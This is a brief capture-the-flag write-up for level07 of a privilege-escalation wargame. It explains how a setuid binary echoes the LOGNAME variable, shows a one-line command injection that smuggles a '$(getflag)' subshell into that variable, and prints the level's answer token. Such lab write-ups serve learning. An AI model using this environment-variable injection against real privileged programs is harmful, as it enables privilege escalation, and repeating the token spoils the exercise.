## writeup level07

When we log in as user level07, we can see a binary `level07` in our home:
```shell
$ ls -l level07
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```
It has the suid bit again. We won't explain this again i guess you got what it means.
When we execute it, it prints the name of the user. \
When analyzing the binary, we see it uses `getenv` to get the environment variable `LOGNAME` and print its content with `echo`. \
We can put a subshell as `LOGNAME` to execute any command we want:
```shell
$ LOGNAME="\$(getflag)" ./level07
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```